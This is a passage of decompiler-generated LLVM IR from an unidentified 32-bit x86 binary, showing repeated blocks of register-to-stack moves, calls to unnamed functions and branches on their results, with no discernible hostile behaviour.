  %v9_8048f3e = icmp eq i32 %v0_8048f3e, -12
  store i1 %v9_8048f3e, i1* %zf.global-to-local, align 1
  %v2_8048f41 = add i32 %v0_8048f3e, 8
  %v3_8048f41 = inttoptr i32 %v2_8048f41 to i32*
  store i32 %v3_8048f39, i32* %v3_8048f41, align 4
  %v1_8048f42 = add i32 %v0_8048f3e, 120
  %v2_8048f42 = inttoptr i32 %v1_8048f42 to i32*
  %v3_8048f42 = load i32, i32* %v2_8048f42, align 4
  store i32 %v3_8048f42, i32* @edx, align 4
  %v2_8048f46 = add i32 %v0_8048f3e, 4
  %v3_8048f46 = inttoptr i32 %v2_8048f46 to i32*
  store i32 %v3_8048f42, i32* %v3_8048f46, align 4
  %v1_8048f47 = add i32 %v0_8048f3e, 147
  store i32 %v1_8048f47, i32* @ecx, align 4
  %v3_8048f4e = inttoptr i32 %v0_8048f3e to i32*
  store i32 %v1_8048f47, i32* %v3_8048f4e, align 4
  %v4_8048f4f = call i32 @function_80517d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8048f54 = load i32, i32* @esp, align 4
  %v1_8048f54 = add i32 %v0_8048f54, 16
  %v1_8048f57 = add i32 %v4_8048f4f, 1
  %v8_8048f57 = icmp eq i32 %v1_8048f57, 0
  store i1 %v8_8048f57, i1* %zf.global-to-local, align 1
  store i32 %v1_8048f57, i32* %eax.global-to-local, align 4
  br i1 %v8_8048f57, label %dec_label_pc_8048f64, label %dec_label_pc_8048f5a

dec_label_pc_8048f5a:                             ; preds = %dec_label_pc_8048f33
  %v1_8048f5a = add i32 %v0_8048f54, 108
  %v2_8048f5a = inttoptr i32 %v1_8048f5a to i32*
  %v3_8048f5a = load i32, i32* %v2_8048f5a, align 4
  store i32 %v3_8048f5a, i32* %eax.global-to-local, align 4
  %v1_8048f5e = inttoptr i32 %v3_8048f5a to i32*
  store i32 1, i32* %v1_8048f5e, align 4
  %v0_8048f64.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048f64

dec_label_pc_8048f64:                             ; preds = %dec_label_pc_8048f33, %dec_label_pc_8048f5a
  %v0_8048f64 = phi i32 [ %v1_8048f54, %dec_label_pc_8048f33 ], [ %v0_8048f64.pre, %dec_label_pc_8048f5a ]
  %v1_8048f64 = add i32 %v0_8048f64, 92
  %v2_8048f64 = inttoptr i32 %v1_8048f64 to i32*
  %v3_8048f64 = load i32, i32* %v2_8048f64, align 4
  store i32 %v3_8048f64, i32* %edx.global-to-local, align 4
  %v1_8048f68 = add i32 %v3_8048f64, 4
  %v2_8048f68 = inttoptr i32 %v1_8048f68 to i32*
  store i32 0, i32* %v2_8048f68, align 4
  %v0_8048f6f = load i32, i32* %eax.global-to-local, align 4
  %v1_8048f6f = load i32, i32* @esp, align 4
  %v2_8048f6f = add i32 %v1_8048f6f, -4
  %v3_8048f6f = inttoptr i32 %v2_8048f6f to i32*
  store i32 %v0_8048f6f, i32* %v3_8048f6f, align 4
  %v0_8048f70 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048f70 = add i32 %v1_8048f6f, -8
  %v3_8048f70 = inttoptr i32 %v2_8048f70 to i32*
  store i32 %v0_8048f70, i32* %v3_8048f70, align 4
  %v1_8048f71 = add i32 %v1_8048f6f, -12
  %v2_8048f71 = inttoptr i32 %v1_8048f71 to i32*
  store i32 0, i32* %v2_8048f71, align 4
  %v1_8048f73 = add i32 %v1_8048f6f, -16
  %v2_8048f73 = inttoptr i32 %v1_8048f73 to i32*
  store i32 44, i32* %v2_8048f73, align 4
  %v3_8048f75 = call i32 @function_8050b30(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048f75, i32* %eax.global-to-local, align 4
  %v0_8048f7a = load i32, i32* @esp, align 4
  %v9_8048f7a = icmp eq i32 %v0_8048f7a, -12
  store i1 %v9_8048f7a, i1* %zf.global-to-local, align 1
  %v2_8048f7d = add i32 %v0_8048f7a, 8
  %v3_8048f7d = inttoptr i32 %v2_8048f7d to i32*
  store i32 %v3_8048f75, i32* %v3_8048f7d, align 4
  %v1_8048f7e = add i32 %v0_8048f7a, 120
  %v2_8048f7e = inttoptr i32 %v1_8048f7e to i32*
  %v3_8048f7e = load i32, i32* %v2_8048f7e, align 4
  store i32 %v3_8048f7e, i32* %eax.global-to-local, align 4
  %v2_8048f82 = add i32 %v0_8048f7a, 4
  %v3_8048f82 = inttoptr i32 %v2_8048f82 to i32*
  store i32 %v3_8048f7e, i32* %v3_8048f82, align 4
  %v1_8048f83 = add i32 %v0_8048f7a, 147
  store i32 %v1_8048f83, i32* @ecx, align 4
  %v3_8048f8a = inttoptr i32 %v0_8048f7a to i32*
  store i32 %v1_8048f83, i32* %v3_8048f8a, align 4
  %v4_8048f8b = call i32 @function_80517d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8048f90 = load i32, i32* @esp, align 4
  %v1_8048f90 = add i32 %v0_8048f90, 16
  %v1_8048f93 = add i32 %v4_8048f8b, 1
  %v8_8048f93 = icmp eq i32 %v1_8048f93, 0
  store i1 %v8_8048f93, i1* %zf.global-to-local, align 1
  store i32 %v1_8048f93, i32* %eax.global-to-local, align 4
  br i1 %v8_8048f93, label %dec_label_pc_8049044, label %dec_label_pc_8048f9a

dec_label_pc_8048f9a:                             ; preds = %dec_label_pc_8048f64
  %v2_8048f9a = add i32 %v0_8048f90, 12
  %v3_8048f9a = inttoptr i32 %v2_8048f9a to i32*
  store i32 %v1_8048f93, i32* %v3_8048f9a, align 4
  %v0_8048f9b = load i32, i32* %eax.global-to-local, align 4
  %v2_8048f9b = add i32 %v0_8048f90, 8
  %v3_8048f9b = inttoptr i32 %v2_8048f9b to i32*
  store i32 %v0_8048f9b, i32* %v3_8048f9b, align 4
  %v1_8048f9c = add i32 %v0_8048f90, 4
  %v2_8048f9c = inttoptr i32 %v1_8048f9c to i32*
  store i32 0, i32* %v2_8048f9c, align 4
  %v2_8048f9e = inttoptr i32 %v0_8048f90 to i32*
  store i32 44, i32* %v2_8048f9e, align 4
  %v3_8048fa0 = call i32 @function_8050b30(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048fa0, i32* %eax.global-to-local, align 4
  %v0_8048fa5 = load i32, i32* @esp, align 4
  %v9_8048fa5 = icmp eq i32 %v0_8048fa5, -12
  store i1 %v9_8048fa5, i1* %zf.global-to-local, align 1
  %v2_8048fa8 = add i32 %v0_8048fa5, 8
  %v3_8048fa8 = inttoptr i32 %v2_8048fa8 to i32*
  store i32 %v3_8048fa0, i32* %v3_8048fa8, align 4
  %v1_8048fa9 = add i32 %v0_8048fa5, 120
  %v2_8048fa9 = inttoptr i32 %v1_8048fa9 to i32*
  %v3_8048fa9 = load i32, i32* %v2_8048fa9, align 4
  %v2_8048fad = add i32 %v0_8048fa5, 4
  %v3_8048fad = inttoptr i32 %v2_8048fad to i32*
  store i32 %v3_8048fa9, i32* %v3_8048fad, align 4
  %v1_8048fae = add i32 %v0_8048fa5, 147
  store i32 %v1_8048fae, i32* %eax.global-to-local, align 4
  %v3_8048fb5 = inttoptr i32 %v0_8048fa5 to i32*
  store i32 %v1_8048fae, i32* %v3_8048fb5, align 4
  %v4_8048fb6 = call i32 @function_80517d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8048fb6, i32* %eax.global-to-local, align 4
  %v0_8048fbb = load i32, i32* @esp, align 4
  %v6_8048fbb = icmp eq i32 %v0_8048fbb, -16
  store i1 %v6_8048fbb, i1* %zf.global-to-local, align 1
  store i32 %v4_8048fb6, i32* %ebx.global-to-local, align 4
  %v2_8048fc0 = add i32 %v4_8048fb6, 147
  %v3_8048fc0 = add i32 %v2_8048fc0, %v0_8048fbb
  %v4_8048fc0 = inttoptr i32 %v3_8048fc0 to i8*
  %v5_8048fc0 = load i8, i8* %v4_8048fc0, align 1
  %v11_8048fc0 = icmp eq i8 %v5_8048fc0, 32
  %v1_8048fc8 = zext i1 %v11_8048fc0 to i32
  %v1_8048fcb = add i32 %v0_8048fbb, 147
  store i32 %v1_8048fcb, i32* %esi.global-to-local, align 4
  store i32 %v1_8048fc8, i32* %eax.global-to-local, align 4
  %v1_8048fd7 = add i32 %v0_8048fbb, 12
  %v2_8048fd7 = inttoptr i32 %v1_8048fd7 to i32*
  store i32 2, i32* %v2_8048fd7, align 4
  %v1_8048fd9 = add i32 %v0_8048fbb, 8
  %v2_8048fd9 = inttoptr i32 %v1_8048fd9 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80543a6.10 to i32), i32* %v2_8048fd9, align 4
  %v0_8048fde = load i32, i32* %ebx.global-to-local, align 4
  %v1_8048fde = load i32, i32* %eax.global-to-local, align 4
  %v2_8048fde = add i32 %v1_8048fde, %v0_8048fde
  store i32 %v2_8048fde, i32* @ebx, align 4
  %v1_8048fe0 = add i32 %v0_8048fbb, 120
  %v2_8048fe0 = inttoptr i32 %v1_8048fe0 to i32*
  %v3_8048fe0 = load i32, i32* %v2_8048fe0, align 4
  %v2_8048fe4 = sub i32 %v3_8048fe0, %v2_8048fde
  store i32 %v2_8048fe4, i32* %eax.global-to-local, align 4
  %v0_8048fe6 = load i32, i32* %esi.global-to-local, align 4
  %v2_8048fe6 = add i32 %v0_8048fe6, %v2_8048fde
  %v12_8048fe6 = icmp eq i32 %v2_8048fe6, 0
  store i1 %v12_8048fe6, i1* %zf.global-to-local, align 1
  store i32 %v2_8048fe6, i32* @esi, align 4
  %v2_8048fe8 = add i32 %v0_8048fbb, 4
  %v3_8048fe8 = inttoptr i32 %v2_8048fe8 to i32*
  store i32 %v2_8048fe4, i32* %v3_8048fe8, align 4
  %v0_8048fe9 = load i32, i32* @esi, align 4
  %v3_8048fe9 = inttoptr i32 %v0_8048fbb to i32*
  store i32 %v0_8048fe9, i32* %v3_8048fe9, align 4
  %v0_8048fea = call i32 @function_8051590()
  store i32 %v0_8048fea, i32* %eax.global-to-local, align 4
  %v0_8048fef = load i32, i32* @esp, align 4
  %v1_8048fef = add i32 %v0_8048fef, 16
  store i32 %v0_8048fea, i32* %edx.global-to-local, align 4
  %v10_8048ff4 = icmp eq i32 %v0_8048fea, -1
  store i1 %v10_8048ff4, i1* %zf.global-to-local, align 1
  br i1 %v10_8048ff4, label %dec_label_pc_8049044, label %dec_label_pc_8048ff9

dec_label_pc_8048ff9:                             ; preds = %dec_label_pc_8048f9a
  %v10_8048ff9 = icmp eq i32 %v0_8048fea, 1
  store i1 %v10_8048ff9, i1* %zf.global-to-local, align 1
  %v7_8048ffc = icmp sgt i32 %v0_8048fea, 1
  br i1 %v7_8048ffc, label %dec_label_pc_8048ffe, label %dec_label_pc_8049001

dec_label_pc_8048ffe:                             ; preds = %dec_label_pc_8048ff9
  %v1_8048ffe = add i32 %v0_8048fea, -2
  %v9_8048ffe = icmp eq i32 %v1_8048ffe, 0
  store i1 %v9_8048ffe, i1* %zf.global-to-local, align 1
  store i32 %v1_8048ffe, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8049001

dec_label_pc_8049001:                             ; preds = %dec_label_pc_8048ff9, %dec_label_pc_8048ffe
  %v1_804900a = phi i32 [ %v0_8048fea, %dec_label_pc_8048ff9 ], [ %v1_8048ffe, %dec_label_pc_8048ffe ]
  %v1_8049001 = add i32 %v0_8048fef, 20920
  %v1_8049008 = load i32, i32* @ebx, align 4
  %v2_8049008 = add i32 %v1_8049001, %v1_8049008
  %v12_8049008 = icmp eq i32 %v2_8049008, 0
  store i1 %v12_8049008, i1* %zf.global-to-local, align 1
  store i32 %v2_8049008, i32* %eax.global-to-local, align 4
  %v2_804900a = add i32 %v1_804900a, -20773
  %v3_804900a = add i32 %v2_804900a, %v2_8049008
  %v4_804900a = inttoptr i32 %v3_804900a to i8*
  store i8 0, i8* %v4_804900a, align 1
  %v0_8049012 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049012 = load i32, i32* @esp, align 4
  %v2_8049012 = add i32 %v1_8049012, -4
  %v3_8049012 = inttoptr i32 %v2_8049012 to i32*
  store i32 %v0_8049012, i32* %v3_8049012, align 4
  %v0_8049013 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049013 = add i32 %v1_8049012, -8
  %v3_8049013 = inttoptr i32 %v2_8049013 to i32*
  store i32 %v0_8049013, i32* %v3_8049013, align 4
  %v1_8049014 = add i32 %v1_8049012, -12
  %v2_8049014 = inttoptr i32 %v1_8049014 to i32*
  store i32 0, i32* %v2_8049014, align 4
  %v1_8049016 = add i32 %v1_8049012, -16
  %v2_8049016 = inttoptr i32 %v1_8049016 to i32*
  store i32 43, i32* %v2_8049016, align 4
  %v3_8049018 = call i32 @function_8050b30(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049018, i32* %eax.global-to-local, align 4
  %v0_804901d = load i32, i32* @esi, align 4
  %v1_804901d = load i32, i32* @esp, align 4
  %v2_804901d = inttoptr i32 %v1_804901d to i32*
  store i32 %v0_804901d, i32* %v2_804901d, align 4
  store i32 %v3_8049018, i32* @ebx, align 4
  %v2_8049022 = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_8049022, i32* %eax.global-to-local, align 4
  %v0_8049027 = load i32, i32* @esp, align 4
  %v9_8049027 = icmp eq i32 %v0_8049027, -12
  store i1 %v9_8049027, i1* %zf.global-to-local, align 1
  %v0_804902a = load i32, i32* @ebx, align 4
  %v2_804902a = add i32 %v0_8049027, 8
  %v3_804902a = inttoptr i32 %v2_804902a to i32*
  store i32 %v0_804902a, i32* %v3_804902a, align 4
  %v2_804902b = add i32 %v0_8049027, 4
  %v3_804902b = inttoptr i32 %v2_804902b to i32*
  store i32 %v2_8049022, i32* %v3_804902b, align 4
  %v0_804902c = load i32, i32* @esi, align 4
  %v3_804902c = inttoptr i32 %v0_8049027 to i32*
  store i32 %v0_804902c, i32* %v3_804902c, align 4
  %v4_804902d = call i32 @function_80517d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804902d, i32* %eax.global-to-local, align 4
  %v0_8049032 = load i32, i32* @esp, align 4
  %v1_8049032 = add i32 %v0_8049032, 16
  %v1_8049035 = icmp eq i32 %v4_804902d, 0
  store i1 %v1_8049035, i1* %zf.global-to-local, align 1
  br i1 %v1_8049035, label %dec_label_pc_8049044, label %dec_label_pc_8049039

dec_label_pc_8049039:                             ; preds = %dec_label_pc_8049001
  %v1_8049039 = add i32 %v0_8049032, 108
  %v2_8049039 = inttoptr i32 %v1_8049039 to i32*
  %v3_8049039 = load i32, i32* %v2_8049039, align 4
  store i32 %v3_8049039, i32* %edx.global-to-local, align 4
  %v1_804903d = add i32 %v3_8049039, 4
  %v2_804903d = inttoptr i32 %v1_804903d to i32*
  store i32 1, i32* %v2_804903d, align 4
  %v0_8049044.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049044

dec_label_pc_8049044:                             ; preds = %dec_label_pc_8049001, %dec_label_pc_8048f9a, %dec_label_pc_8048f64, %dec_label_pc_8049039
  %v0_8049044 = phi i32 [ %v1_8049032, %dec_label_pc_8049001 ], [ %v1_8048fef, %dec_label_pc_8048f9a ], [ %v1_8048f90, %dec_label_pc_8048f64 ], [ %v0_8049044.pre, %dec_label_pc_8049039 ]
  %v1_8049044 = add i32 %v0_8049044, 92
  %v2_8049044 = inttoptr i32 %v1_8049044 to i32*
  %v3_8049044 = load i32, i32* %v2_8049044, align 4
  store i32 %v3_8049044, i32* %ecx.global-to-local, align 4
  %v1_8049048 = add i32 %v3_8049044, 8
  %v2_8049048 = inttoptr i32 %v1_8049048 to i32*
  store i32 0, i32* %v2_8049048, align 4
  %v0_804904f = load i32, i32* %eax.global-to-local, align 4
  %v1_804904f = load i32, i32* @esp, align 4
  %v2_804904f = add i32 %v1_804904f, -4
  %v3_804904f = inttoptr i32 %v2_804904f to i32*
  store i32 %v0_804904f, i32* %v3_804904f, align 4
  %v0_8049050 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049050 = add i32 %v1_804904f, -8
  %v3_8049050 = inttoptr i32 %v2_8049050 to i32*
  store i32 %v0_8049050, i32* %v3_8049050, align 4
  %v1_8049051 = add i32 %v1_804904f, -12
  %v2_8049051 = inttoptr i32 %v1_8049051 to i32*
  store i32 0, i32* %v2_8049051, align 4
  %v1_8049053 = add i32 %v1_804904f, -16
  %v2_8049053 = inttoptr i32 %v1_8049053 to i32*
  store i32 41, i32* %v2_8049053, align 4
  %v3_8049055 = call i32 @function_8050b30(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049055, i32* %eax.global-to-local, align 4
  %v0_804905a = load i32, i32* @esp, align 4
  %v9_804905a = icmp eq i32 %v0_804905a, -12
  store i1 %v9_804905a, i1* %zf.global-to-local, align 1
  %v2_804905d = add i32 %v0_804905a, 8
  %v3_804905d = inttoptr i32 %v2_804905d to i32*
  store i32 %v3_8049055, i32* %v3_804905d, align 4
  %v1_804905e = add i32 %v0_804905a, 120
  %v2_804905e = inttoptr i32 %v1_804905e to i32*
  %v3_804905e = load i32, i32* %v2_804905e, align 4
  %v2_8049062 = add i32 %v0_804905a, 4
  %v3_8049062 = inttoptr i32 %v2_8049062 to i32*
  store i32 %v3_804905e, i32* %v3_8049062, align 4
  %v1_8049063 = add i32 %v0_804905a, 147
  store i32 %v1_8049063, i32* %eax.global-to-local, align 4
  %v3_804906a = inttoptr i32 %v0_804905a to i32*
  store i32 %v1_8049063, i32* %v3_804906a, align 4
  %v4_804906b = call i32 @function_80517d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049070 = load i32, i32* @esp, align 4
  %v1_8049070 = add i32 %v0_8049070, 16
  %v1_8049073 = add i32 %v4_804906b, 1
  %v8_8049073 = icmp eq i32 %v1_8049073, 0
  store i1 %v8_8049073, i1* %zf.global-to-local, align 1
  store i32 %v1_8049073, i32* %eax.global-to-local, align 4
  br i1 %v8_8049073, label %dec_label_pc_8049124, label %dec_label_pc_804907a

dec_label_pc_804907a:                             ; preds = %dec_label_pc_8049044
  %v0_804907a = load i32, i32* @edi, align 4
  %v2_804907a = add i32 %v0_8049070, 12
  %v3_804907a = inttoptr i32 %v2_804907a to i32*
  store i32 %v0_804907a, i32* %v3_804907a, align 4
  %v0_804907b = load i32, i32* @edi, align 4
  %v2_804907b = add i32 %v0_8049070, 8
  %v3_804907b = inttoptr i32 %v2_804907b to i32*
  store i32 %v0_804907b, i32* %v3_804907b, align 4
  %v1_804907c = add i32 %v0_8049070, 4
  %v2_804907c = inttoptr i32 %v1_804907c to i32*
  store i32 0, i32* %v2_804907c, align 4
  %v2_804907e = inttoptr i32 %v0_8049070 to i32*
  store i32 41, i32* %v2_804907e, align 4
  %v3_8049080 = call i32 @function_8050b30(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049080, i32* %eax.global-to-local, align 4
  %v0_8049085 = load i32, i32* @esp, align 4
  %v9_8049085 = icmp eq i32 %v0_8049085, -12
  store i1 %v9_8049085, i1* %zf.global-to-local, align 1
  %v2_8049088 = add i32 %v0_8049085, 8
  %v3_8049088 = inttoptr i32 %v2_8049088 to i32*
  store i32 %v3_8049080, i32* %v3_8049088, align 4
  %v1_8049089 = add i32 %v0_8049085, 120
  %v2_8049089 = inttoptr i32 %v1_8049089 to i32*
  %v3_8049089 = load i32, i32* %v2_8049089, align 4
  %v2_804908d = add i32 %v0_8049085, 4
  %v3_804908d = inttoptr i32 %v2_804908d to i32*
  store i32 %v3_8049089, i32* %v3_804908d, align 4
  %v1_804908e = add i32 %v0_8049085, 147
  store i32 %v1_804908e, i32* @edx, align 4
  %v3_8049095 = inttoptr i32 %v0_8049085 to i32*
  store i32 %v1_804908e, i32* %v3_8049095, align 4
  %v4_8049096 = call i32 @function_80517d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049096, i32* %eax.global-to-local, align 4
  %v0_804909b = load i32, i32* @esp, align 4
  %v6_804909b = icmp eq i32 %v0_804909b, -16
  store i1 %v6_804909b, i1* %zf.global-to-local, align 1
  store i32 %v4_8049096, i32* %ebx.global-to-local, align 4
  %v2_80490a0 = add i32 %v4_8049096, 147
  %v3_80490a0 = add i32 %v2_80490a0, %v0_804909b
  %v4_80490a0 = inttoptr i32 %v3_80490a0 to i8*
  %v5_80490a0 = load i8, i8* %v4_80490a0, align 1
  %v11_80490a0 = icmp eq i8 %v5_80490a0, 32
  %v1_80490a8 = zext i1 %v11_80490a0 to i32
  %v1_80490ab = add i32 %v0_804909b, 147
  store i32 %v1_80490ab, i32* %esi.global-to-local, align 4
  store i32 %v1_80490a8, i32* %eax.global-to-local, align 4
  %v1_80490b7 = add i32 %v0_804909b, 12
  %v2_80490b7 = inttoptr i32 %v1_80490b7 to i32*
  store i32 2, i32* %v2_80490b7, align 4
  %v1_80490b9 = add i32 %v0_804909b, 8
  %v2_80490b9 = inttoptr i32 %v1_80490b9 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80543a6.10 to i32), i32* %v2_80490b9, align 4
  %v0_80490be = load i32, i32* %ebx.global-to-local, align 4
  %v1_80490be = load i32, i32* %eax.global-to-local, align 4
  %v2_80490be = add i32 %v1_80490be, %v0_80490be
  store i32 %v2_80490be, i32* @ebx, align 4
  %v1_80490c0 = add i32 %v0_804909b, 120
  %v2_80490c0 = inttoptr i32 %v1_80490c0 to i32*
  %v3_80490c0 = load i32, i32* %v2_80490c0, align 4
  %v2_80490c4 = sub i32 %v3_80490c0, %v2_80490be
  store i32 %v2_80490c4, i32* %eax.global-to-local, align 4
  %v0_80490c6 = load i32, i32* %esi.global-to-local, align 4
  %v2_80490c6 = add i32 %v0_80490c6, %v2_80490be
  %v12_80490c6 = icmp eq i32 %v2_80490c6, 0
  store i1 %v12_80490c6, i1* %zf.global-to-local, align 1
  store i32 %v2_80490c6, i32* @esi, align 4
  %v2_80490c8 = add i32 %v0_804909b, 4
  %v3_80490c8 = inttoptr i32 %v2_80490c8 to i32*
  store i32 %v2_80490c4, i32* %v3_80490c8, align 4
  %v0_80490c9 = load i32, i32* @esi, align 4
  %v3_80490c9 = inttoptr i32 %v0_804909b to i32*
  store i32 %v0_80490c9, i32* %v3_80490c9, align 4
  %v0_80490ca = call i32 @function_8051590()
  store i32 %v0_80490ca, i32* %eax.global-to-local, align 4
  %v0_80490cf = load i32, i32* @esp, align 4
  %v1_80490cf = add i32 %v0_80490cf, 16
  store i32 %v0_80490ca, i32* %edx.global-to-local, align 4
  %v10_80490d4 = icmp eq i32 %v0_80490ca, -1
  store i1 %v10_80490d4, i1* %zf.global-to-local, align 1
  br i1 %v10_80490d4, label %dec_label_pc_8049124, label %dec_label_pc_80490d9

dec_label_pc_80490d9:                             ; preds = %dec_label_pc_804907a
  %v10_80490d9 = icmp eq i32 %v0_80490ca, 1
  store i1 %v10_80490d9, i1* %zf.global-to-local, align 1
  %v7_80490dc = icmp sgt i32 %v0_80490ca, 1
  br i1 %v7_80490dc, label %dec_label_pc_80490de, label %dec_label_pc_80490e1

dec_label_pc_80490de:                             ; preds = %dec_label_pc_80490d9
  %v1_80490de = add i32 %v0_80490ca, -2
  %v9_80490de = icmp eq i32 %v1_80490de, 0
  store i1 %v9_80490de, i1* %zf.global-to-local, align 1
  store i32 %v1_80490de, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80490e1

dec_label_pc_80490e1:                             ; preds = %dec_label_pc_80490d9, %dec_label_pc_80490de
  %v1_80490ea = phi i32 [ %v0_80490ca, %dec_label_pc_80490d9 ], [ %v1_80490de, %dec_label_pc_80490de ]
  %v1_80490e1 = add i32 %v0_80490cf, 20920
  %v1_80490e8 = load i32, i32* @ebx, align 4
  %v2_80490e8 = add i32 %v1_80490e1, %v1_80490e8
  %v12_80490e8 = icmp eq i32 %v2_80490e8, 0
  store i1 %v12_80490e8, i1* %zf.global-to-local, align 1
  store i32 %v2_80490e8, i32* %eax.global-to-local, align 4
  %v2_80490ea = add i32 %v1_80490ea, -20773
  %v3_80490ea = add i32 %v2_80490ea, %v2_80490e8
  %v4_80490ea = inttoptr i32 %v3_80490ea to i8*
  store i8 0, i8* %v4_80490ea, align 1
  %v0_80490f2 = load i32, i32* @ebx, align 4
  %v1_80490f2 = load i32, i32* @esp, align 4
  %v2_80490f2 = add i32 %v1_80490f2, -4
  %v3_80490f2 = inttoptr i32 %v2_80490f2 to i32*
  store i32 %v0_80490f2, i32* %v3_80490f2, align 4
  %v0_80490f3 = load i32, i32* @ebx, align 4
  %v2_80490f3 = add i32 %v1_80490f2, -8
  %v3_80490f3 = inttoptr i32 %v2_80490f3 to i32*
  store i32 %v0_80490f3, i32* %v3_80490f3, align 4
  %v1_80490f4 = add i32 %v1_80490f2, -12
  %v2_80490f4 = inttoptr i32 %v1_80490f4 to i32*
  store i32 0, i32* %v2_80490f4, align 4
  %v1_80490f6 = add i32 %v1_80490f2, -16
  %v2_80490f6 = inttoptr i32 %v1_80490f6 to i32*
  store i32 42, i32* %v2_80490f6, align 4
  %v3_80490f8 = call i32 @function_8050b30(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_80490f8, i32* %eax.global-to-local, align 4
  %v0_80490fd = load i32, i32* @esi, align 4
  %v1_80490fd = load i32, i32* @esp, align 4
  %v2_80490fd = inttoptr i32 %v1_80490fd to i32*
  store i32 %v0_80490fd, i32* %v2_80490fd, align 4
  store i32 %v3_80490f8, i32* @ebx, align 4
  %v2_8049102 = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_8049102, i32* %eax.global-to-local, align 4
  %v0_8049107 = load i32, i32* @esp, align 4
  %v9_8049107 = icmp eq i32 %v0_8049107, -12
  store i1 %v9_8049107, i1* %zf.global-to-local, align 1
  %v0_804910a = load i32, i32* @ebx, align 4
  %v2_804910a = add i32 %v0_8049107, 8
  %v3_804910a = inttoptr i32 %v2_804910a to i32*
  store i32 %v0_804910a, i32* %v3_804910a, align 4
  %v2_804910b = add i32 %v0_8049107, 4
  %v3_804910b = inttoptr i32 %v2_804910b to i32*
  store i32 %v2_8049102, i32* %v3_804910b, align 4
  %v0_804910c = load i32, i32* @esi, align 4
  %v3_804910c = inttoptr i32 %v0_8049107 to i32*
  store i32 %v0_804910c, i32* %v3_804910c, align 4
  %v4_804910d = call i32 @function_80517d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804910d, i32* %eax.global-to-local, align 4
  %v0_8049112 = load i32, i32* @esp, align 4
  %v1_8049112 = add i32 %v0_8049112, 16
  %v1_8049115 = icmp eq i32 %v4_804910d, 0
  store i1 %v1_8049115, i1* %zf.global-to-local, align 1
  br i1 %v1_8049115, label %dec_label_pc_8049124, label %dec_label_pc_8049119

dec_label_pc_8049119:                             ; preds = %dec_label_pc_80490e1
  %v1_8049119 = add i32 %v0_8049112, 108
  %v2_8049119 = inttoptr i32 %v1_8049119 to i32*
  %v3_8049119 = load i32, i32* %v2_8049119, align 4
  store i32 %v3_8049119, i32* @ecx, align 4
  %v1_804911d = add i32 %v3_8049119, 8
  %v2_804911d = inttoptr i32 %v1_804911d to i32*
  store i32 1, i32* %v2_804911d, align 4
  %v1_8049124.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049124

dec_label_pc_8049124:                             ; preds = %dec_label_pc_80490e1, %dec_label_pc_804907a, %dec_label_pc_8049044, %dec_label_pc_8049119
  %v1_8049124 = phi i32 [ %v1_8049112, %dec_label_pc_80490e1 ], [ %v1_80490cf, %dec_label_pc_804907a ], [ %v1_8049070, %dec_label_pc_8049044 ], [ %v1_8049124.pre, %dec_label_pc_8049119 ]
  %v0_8049124 = load i32, i32* @ecx, align 4
  %v2_8049124 = add i32 %v1_8049124, -4
  %v3_8049124 = inttoptr i32 %v2_8049124 to i32*
  store i32 %v0_8049124, i32* %v3_8049124, align 4
  %v0_8049125 = load i32, i32* @ecx, align 4
  %v2_8049125 = add i32 %v1_8049124, -8
  %v3_8049125 = inttoptr i32 %v2_8049125 to i32*
  store i32 %v0_8049125, i32* %v3_8049125, align 4
  %v1_8049126 = add i32 %v1_8049124, -12
  %v2_8049126 = inttoptr i32 %v1_8049126 to i32*
  store i32 0, i32* %v2_8049126, align 4
  %v1_8049128 = add i32 %v1_8049124, -16
  %v2_8049128 = inttoptr i32 %v1_8049128 to i32*
  store i32 40, i32* %v2_8049128, align 4
  %v3_804912a = call i32 @function_8050b30(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_804912a, i32* %eax.global-to-local, align 4
  %v0_804912f = load i32, i32* @esp, align 4
  %v9_804912f = icmp eq i32 %v0_804912f, -12
  store i1 %v9_804912f, i1* %zf.global-to-local, align 1
  %v2_8049132 = add i32 %v0_804912f, 8
  %v3_8049132 = inttoptr i32 %v2_8049132 to i32*
  store i32 %v3_804912a, i32* %v3_8049132, align 4
  %v1_8049133 = add i32 %v0_804912f, 120
  %v2_8049133 = inttoptr i32 %v1_8049133 to i32*
  %v3_8049133 = load i32, i32* %v2_8049133, align 4
  store i32 %v3_8049133, i32* @edx, align 4
  %v2_8049137 = add i32 %v0_804912f, 4
  %v3_8049137 = inttoptr i32 %v2_8049137 to i32*
  store i32 %v3_8049133, i32* %v3_8049137, align 4
  %v1_8049138 = add i32 %v0_804912f, 147
  store i32 %v1_8049138, i32* %eax.global-to-local, align 4
  %v3_804913f = inttoptr i32 %v0_804912f to i32*
